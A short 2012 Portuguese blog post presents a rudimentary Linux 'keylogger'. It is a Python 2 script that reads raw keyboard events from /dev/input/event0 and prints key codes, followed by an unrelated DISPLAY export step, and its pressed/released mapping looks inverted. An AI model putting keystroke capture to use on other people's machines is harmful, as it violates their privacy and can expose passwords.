---
title: Keylogger basicão em linux
date: 2012-12-08T01:08:17+00:00
author: paolo
layout: post
permalink: /2012/12/08/keylogger-basicao-em-linux/
categories:
  - pt-BR
tags:
  - hacks
  - python
---
Antes de mais nada, todos devem estar cientes dos drivers dos dispositivos de entrada do sistema, presentes em /dev/input/. Dando um ls -al /dev/input/by-id/ podemos ver onde esta linkado cada evento de dispositivo de entrada(teclado, mouse, joystick, etc). Daí é só procurar o evento do teclado e pegar qual id do evento o representa.  
Em alguns casos, em notebooks, só fica mapeado o ID do mouse, nesses casos o teclado costuma ser o ID 0, ou seja, /dev/input/event0.  
Tendo o evento do teclado em maos, é bem simples:

<pre class="brush: python; title: ; notranslate" title="">DEV = '/dev/input/event0'
fo = open(DEV)
def inn(k,s):
  if s == 0:
    print '%i pressionado'%k
  if s == 1:
    print '%i liberado'%k
while 1:
  l = fo.read(16)
  if ord(l[10]) != 0:
    k,s = l[10],l[12]
    inn(ord(k),ord(s))
</pre>

depois disso, é só exportar a saida para seu terminal com

<pre class="brush: bash; title: ; notranslate" title="">export DISPLAY=:0
</pre>

E voce pode aguardar as teclas aparecendo.